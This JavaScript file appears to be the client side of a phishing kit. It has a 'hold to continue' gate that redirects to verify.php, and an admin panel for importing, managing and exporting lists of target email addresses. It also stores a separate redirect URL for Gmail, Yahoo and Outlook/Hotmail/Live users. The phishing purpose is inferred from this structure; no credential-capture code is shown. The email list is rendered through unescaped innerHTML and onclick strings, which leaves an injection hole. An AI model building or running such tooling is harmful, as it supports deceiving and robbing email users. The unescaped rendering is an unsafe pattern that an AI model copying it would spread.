document.addEventListener('DOMContentLoaded', function() {
    if (document.getElementById('hold-button')) {
        initHoldButton();
    }
    
    if (document.querySelector('.admin-container')) {
        initAdminPanel();
    }
});

function initHoldButton() {
    const holdButton = document.getElementById('hold-button');
    const progressCircle = document.querySelector('.progress-circle');
    const buttonText = document.querySelector('.button-text');
    const statusText = document.getElementById('status-text');
    
    let isHolding = false;
    let startTime = 0;
    let animationFrame = null;
    const holdDuration = 5000;
    const circumference = 2 * Math.PI * 54;
    
    progressCircle.style.strokeDasharray = circumference;
    progressCircle.style.strokeDashoffset = circumference;
    
    function updateProgress(elapsed) {
        const progress = Math.min(elapsed / holdDuration, 1);
        const offset = circumference - (progress * circumference);
        progressCircle.style.strokeDashoffset = offset;
        
        const percentage = Math.floor(progress * 100);
        buttonText.textContent = `${percentage}%`;
        statusText.textContent = `Loading... ${percentage}%`;
        
        if (progress >= 1) {
            statusText.textContent = 'Complete! Redirecting...';
            setTimeout(() => {
                window.location.href = 'verify.php';
            }, 500);
            return;
        }
        
        if (isHolding) {
            animationFrame = requestAnimationFrame(() => {
                updateProgress(Date.now() - startTime);
            });
        }
    }
    
    function startHolding() {
        if (!isHolding) {
            isHolding = true;
            startTime = Date.now();
            statusText.textContent = 'Hold to continue...';
            updateProgress(0);
        }
    }
    
    function stopHolding() {
        if (isHolding) {
            isHolding = false;
            if (animationFrame) {
                cancelAnimationFrame(animationFrame);
            }
            progressCircle.style.strokeDashoffset = circumference;
            buttonText.textContent = 'Hold to Continue';
            statusText.textContent = 'Ready';
        }
    }
    
    holdButton.addEventListener('mousedown', startHolding);
    holdButton.addEventListener('mouseup', stopHolding);
    holdButton.addEventListener('mouseleave', stopHolding);
    holdButton.addEventListener('touchstart', startHolding);
    holdButton.addEventListener('touchend', stopHolding);
    holdButton.addEventListener('touchcancel', stopHolding);
}

function initAdminPanel() {
    initNavigation();
    initFileImport();
    initEmailManagement();
    initRedirectSettings();
    loadRedirectSettings();
}

function initNavigation() {
    const navItems = document.querySelectorAll('.nav-item');
    const sections = document.querySelectorAll('.admin-section');
    
    navItems.forEach(item => {
        item.addEventListener('click', () => {
            navItems.forEach(nav => nav.classList.remove('active'));
            sections.forEach(section => section.classList.remove('active'));
            
            item.classList.add('active');
            const targetSection = item.dataset.section + '-section';
            document.getElementById(targetSection).classList.add('active');
        });
    });
}

function initFileImport() {
    const fileInput = document.getElementById('file-input');
    const dropZone = document.getElementById('drop-zone');
    const importBtn = document.getElementById('import-btn');
    let selectedFile = null;
    
    dropZone.addEventListener('click', () => fileInput.click());
    
    dropZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        dropZone.classList.add('dragover');
    });
    
    dropZone.addEventListener('dragleave', () => {
        dropZone.classList.remove('dragover');
    });
    
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.classList.remove('dragover');
        const files = e.dataTransfer.files;
        if (files.length > 0) {
            handleFileSelect(files[0]);
        }
    });
    
    fileInput.addEventListener('change', (e) => {
        if (e.target.files.length > 0) {
            handleFileSelect(e.target.files[0]);
        }
    });
    
    function handleFileSelect(file) {
        selectedFile = file;
        dropZone.querySelector('p').textContent = `Selected: ${file.name}`;
        importBtn.disabled = false;
    }
    
    importBtn.addEventListener('click', () => {
        if (selectedFile) {
            importEmails(selectedFile);
        }
    });
}

function importEmails(file) {
    const formData = new FormData();
    formData.append('file', file);
    
    fetch('import.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert(`Successfully imported ${data.count} emails`);
            location.reload();
        } else {
            alert('Import failed: ' + data.message);
        }
    })
    .catch(error => {
        alert('Import error: ' + error.message);
    });
}

function initEmailManagement() {
    const searchInput = document.getElementById('search-input');
    const searchBtn = document.getElementById('search-btn');
    const addEmailBtn = document.getElementById('add-email-btn');
    const newEmailInput = document.getElementById('new-email');
    
    searchBtn.addEventListener('click', performSearch);
    searchInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') performSearch();
    });
    
    addEmailBtn.addEventListener('click', addNewEmail);
    newEmailInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') addNewEmail();
    });
}

function performSearch() {
    const query = document.getElementById('search-input').value;
    
    fetch('search_email.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'query=' + encodeURIComponent(query)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            updateEmailList(data.emails);
        }
    });
}

function addNewEmail() {
    const email = document.getElementById('new-email').value;
    
    if (!email || !isValidEmail(email)) {
        alert('Please enter a valid email address');
        return;
    }
    
    fetch('add_email.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'email=' + encodeURIComponent(email)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Email added successfully');
            document.getElementById('new-email').value = '';
            performSearch();
        } else {
            alert('Failed to add email: ' + data.message);
        }
    });
}

function deleteEmail(id) {
    if (!confirm('Are you sure you want to delete this email?')) return;
    
    fetch('delete_email.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'id=' + encodeURIComponent(id)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.querySelector(`[data-id="${id}"]`).remove();
        } else {
            alert('Failed to delete email');
        }
    });
}

function updateEmailList(emails) {
    const emailList = document.getElementById('email-list');
    emailList.innerHTML = '';
    
    emails.forEach(email => {
        const item = document.createElement('div');
        item.className = 'email-item';
        item.dataset.id = email._id;
        item.innerHTML = `
            <span class="email-address">${email.email}</span>
            <button class="delete-btn" onclick="deleteEmail('${email._id}')">Delete</button>
        `;
        emailList.appendChild(item);
    });
}

function initRedirectSettings() {
    const saveBtn = document.getElementById('save-redirects-btn');
    saveBtn.addEventListener('click', saveRedirectSettings);
}

function saveRedirectSettings() {
    const settings = {
        'gmail.com': document.getElementById('gmail-url').value,
        'yahoo.com': document.getElementById('yahoo-url').value,
        'outlook.com': document.getElementById('outlook-url').value,
        'hotmail.com': document.getElementById('outlook-url').value,
        'live.com': document.getElementById('outlook-url').value,
        'default': document.getElementById('default-url').value
    };
    
    fetch('save_redirects.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(settings)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Redirect settings saved successfully');
        } else {
            alert('Failed to save settings');
        }
    });
}

function loadRedirectSettings() {
    fetch('redirect_map.json')
    .then(response => response.json())
    .then(data => {
        document.getElementById('gmail-url').value = data['gmail.com'] || '';
        document.getElementById('yahoo-url').value = data['yahoo.com'] || '';
        document.getElementById('outlook-url').value = data['outlook.com'] || '';
        document.getElementById('default-url').value = data['default'] || '';
    })
    .catch(() => {});
}

function exportData(format) {
    window.location.href = `export.php?format=${format}`;
}

function isValidEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}
